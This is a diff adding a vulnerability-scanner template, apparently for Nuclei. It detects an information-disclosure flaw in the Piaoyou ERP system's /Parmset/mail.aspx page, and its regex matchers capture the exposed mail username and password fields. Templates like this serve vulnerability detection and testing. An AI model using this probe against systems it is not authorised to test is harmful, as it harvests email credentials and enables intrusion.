@@ -1,0 +1,27 @@
+id: poc-yaml-piaoyou-erp-ms-mail-aspx-info-leak
+info:
+  name: 票友ERP管理系统 mail.aspx 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  description: |
+    票友ERP管理系统 mail.aspx 信息泄露漏洞，允许攻击者获取邮箱参数设置的敏感信息。
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/Parmset/mail.aspx'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '<input name="mailuser" type="text" value="([0-9a-z_]+)" id="mailuser"'
+      - type: regex
+        regex:
+          - '<input name="mailpwd" type="text" value="([0-9a-z]+)" id="mailpwd"'
+      - type: word
+        words:
+          - "邮箱参数设置"
